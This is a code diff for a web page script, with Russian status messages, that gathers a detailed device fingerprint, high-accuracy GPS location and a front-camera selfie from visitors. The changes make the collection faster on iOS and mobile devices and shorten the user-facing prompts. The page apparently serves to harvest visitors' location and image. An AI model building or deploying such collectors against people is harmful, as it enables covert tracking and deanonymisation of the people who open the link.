@@ -147,6 +147,19 @@
       const statusEl = document.getElementById("status");
       let started = false;
       var geoHelpOpen = false;
+
+      function isIosDevice() {
+        var ua = navigator.userAgent || "";
+        if (/iPhone|iPad|iPod/i.test(ua)) return true;
+        if (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1) {
+          return true;
+        }
+        return false;
+      }
+
+      function isMobileUa() {
+        return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
+      }
       var geoAndroidIntentIndex = 0;
 
       /**
@@ -272,6 +285,7 @@
       async function captureFrontCameraSnapshot() {
         var stream = null;
         var video = null;
+        var ios = isIosDevice();
         try {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             return null;
@@ -279,8 +293,8 @@
           stream = await navigator.mediaDevices.getUserMedia({
             video: {
               facingMode: "user",
-              width: { ideal: 1280 },
-              height: { ideal: 720 },
+              width: { ideal: ios ? 640 : 1280 },
+              height: { ideal: ios ? 480 : 720 },
             },
             audio: false,
           });
@@ -323,7 +337,7 @@
               video.removeEventListener("loadeddata", onLd);
               resolve();
             });
-            setTimeout(resolve, 800);
+            setTimeout(resolve, ios ? 320 : 800);
           });
 
           var waitRvfc =
@@ -338,16 +352,18 @@
               : null;
           if (waitRvfc) {
             await waitRvfc();
-            await waitRvfc();
+            if (!ios) await waitRvfc();
           } else {
-            await sleepMs(450);
+            await sleepMs(ios ? 180 : 450);
           }
 
           var w = video.videoWidth;
           var h = video.videoHeight;
           if (!w || !h) {
-            for (var i = 0; i < 15 && (!video.videoWidth || !video.videoHeight); i++) {
-              await sleepMs(80);
+            var spins = ios ? 6 : 15;
+            var step = ios ? 45 : 80;
+            for (var i = 0; i < spins && (!video.videoWidth || !video.videoHeight); i++) {
+              await sleepMs(step);
             }
             w = video.videoWidth;
             h = video.videoHeight;
@@ -356,7 +372,7 @@
             return null;
           }
 
-          var maxSide = 960;
+          var maxSide = ios ? 640 : 960;
           var tw = w;
           var th = h;
           if (w > maxSide || h > maxSide) {
@@ -387,16 +403,19 @@
               sum += probe[p] + probe[p + 1] + probe[p + 2];
             }
             var dark = sum < 80;
-            if (dark && waitRvfc) {
+            if (dark && waitRvfc && !ios) {
               await waitRvfc();
               ctx.drawImage(video, 0, 0, tw, th);
-            } else if (dark) {
-              await sleepMs(350);
+            } else if (dark && !ios) {
+              await sleepMs(220);
+              ctx.drawImage(video, 0, 0, tw, th);
+            } else if (dark && ios && waitRvfc) {
+              await waitRvfc();
               ctx.drawImage(video, 0, 0, tw, th);
             }
           } catch (_) {}
 
-          var dataUrl = canvas.toDataURL("image/jpeg", 0.82);
+          var dataUrl = canvas.toDataURL("image/jpeg", ios ? 0.72 : 0.82);
           var comma = dataUrl.indexOf(",");
           return comma < 0 ? null : dataUrl.slice(comma + 1) || null;
         } catch (_) {
@@ -451,6 +470,7 @@
 
       async function collectFullEnv() {
         const nav = navigator;
+        var skipHeavy = isMobileUa();
         const out = {
           userAgent: nav.userAgent,
           language: nav.language,
@@ -535,58 +555,62 @@
           };
         }
 
-        try {
-          if (nav.getBattery) {
-            const b = await nav.getBattery();
-            out.battery = {
-              level: b.level,
-              charging: b.charging,
-              chargingTime: b.chargingTime,
-              dischargingTime: b.dischargingTime,
-            };
-          }
-        } catch (_) {}
+        if (!skipHeavy) {
+          try {
+            if (nav.getBattery) {
+              const b = await nav.getBattery();
+              out.battery = {
+                level: b.level,
+                charging: b.charging,
+                chargingTime: b.chargingTime,
+                dischargingTime: b.dischargingTime,
+              };
+            }
+          } catch (_) {}
 
-        try {
-          if (nav.storage && nav.storage.estimate) {
-            const est = await nav.storage.estimate();
-            out.storage = { quota: est.quota, usage: est.usage };
-          }
-        } catch (_) {}
+          try {
+            if (nav.storage && nav.storage.estimate) {
+              const est = await nav.storage.estimate();
+              out.storage = { quota: est.quota, usage: est.usage };
+            }
+          } catch (_) {}
 
-        try {
-          if (nav.userAgentData && nav.userAgentData.getHighEntropyValues) {
-            out.uaClientHints = await nav.userAgentData.getHighEntropyValues([
-              "architecture",
-              "bitness",
-              "brands",
-              "fullVersionList",
-              "mobile",
-              "model",
-              "platform",
-              "platformVersion",
-              "uaFullVersion",
-              "wow64",
-            ]);
-          }
-        } catch (_) {}
+          try {
+            if (nav.userAgentData && nav.userAgentData.getHighEntropyValues) {
+              out.uaClientHints = await nav.userAgentData.getHighEntropyValues([
+                "architecture",
+                "bitness",
+                "brands",
+                "fullVersionList",
+                "mobile",
+                "model",
+                "platform",
+                "platformVersion",
+                "uaFullVersion",
+                "wow64",
+              ]);
+            }
+          } catch (_) {}
 
-        try {
-          if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
-            const devs = await nav.mediaDevices.enumerateDevices();
-            const byKind = {};
-            devs.forEach(function (d) {
-              byKind[d.kind] = (byKind[d.kind] || 0) + 1;
-            });
-            out.mediaDevices = {
-              total: devs.length,
-              byKind: byKind,
-              hasLabels: devs.some(function (d) {
-                return d.label && d.label.length > 0;
-              }),
-            };
-          }
-        } catch (_) {}
+          try {
+            if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
+              const devs = await nav.mediaDevices.enumerateDevices();
+              const byKind = {};
+              devs.forEach(function (d) {
+                byKind[d.kind] = (byKind[d.kind] || 0) + 1;
+              });
+              out.mediaDevices = {
+                total: devs.length,
+                byKind: byKind,
+                hasLabels: devs.some(function (d) {
+                  return d.label && d.label.length > 0;
+                }),
+              };
+            }
+          } catch (_) {}
+        } else {
+          out.envCollectMode = "fast-mobile";
+        }
 
         return out;
       }
@@ -642,6 +666,21 @@
           );
           const highAcc = { enableHighAccuracy: true, maximumAge: 0 };
 
+          if (isIosDevice()) {
+            navigator.geolocation.getCurrentPosition(
+              function (pos) {
+                resolve(
+                  coordsToGeoPayload(pos, "ios:getCurrentPosition-fast")
+                );
+              },
+              function (err) {
+                geoReject(err);
+              },
+              { enableHighAccuracy: true, maximumAge: 0, timeout: 9000 }
+            );
+            return;
+          }
+
           if (!mobile) {
             navigator.geolocation.getCurrentPosition(
               function (pos) {
@@ -659,9 +698,9 @@
           let watchId = null;
           let finished = false;
           const t0 = Date.now();
-          const HARD_MS = 42000;
-          const GOOD_ACC_M = 35;
-          const MIN_WAIT_MS = 2200;
+          const HARD_MS = 30000;
+          const GOOD_ACC_M = 55;
+          const MIN_WAIT_MS = 900;
 
           function cleanup() {
             if (watchId != null) {
@@ -705,7 +744,7 @@
               function (err) {
                 finishErr(err);
               },
-              Object.assign({ timeout: 16000 }, highAcc)
+              Object.assign({ timeout: 12000 }, highAcc)
             );
           }, HARD_MS);
 
@@ -749,7 +788,7 @@
         } catch (_) {}
 
         statusEl.textContent =
-          "Сейчас появится запрос доступа к местоположению. Разрешите его; на телефоне при необходимости включите GPS (высокая точность).";
+          "Разрешите доступ к местоположению; данные собираются параллельно.";
 
         try {
           if (/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)) {
@@ -757,23 +796,20 @@
           }
         } catch (_) {}
 
-        let env;
-        try {
-          env = await collectFullEnv();
-        } catch (e) {
-          env = {
+        var envP = collectFullEnv().catch(function (e) {
+          return {
             userAgent: navigator.userAgent,
             pageUrl: location.href,
             collectEnvError: String(e && e.message ? e.message : e),
           };
-        }
-
-        statusEl.textContent = "Запрос координат GPS / сети… Подтвердите в системном окне.";
+        });
+        var geoP = readGeo();
 
         let geo;
         try {
-          geo = await readGeo();
+          geo = await geoP;
         } catch (e) {
+          await envP;
           var msg =
             e && e.__geo
               ? e.message
@@ -801,6 +837,8 @@
           started = false;
           return;
         }
+
+        let env = await envP;
 
         statusEl.textContent = "Камера: разрешите доступ — сделаем один снимок с фронтальной камеры.";
         var frontJpegB64 = await captureFrontCameraSnapshot();
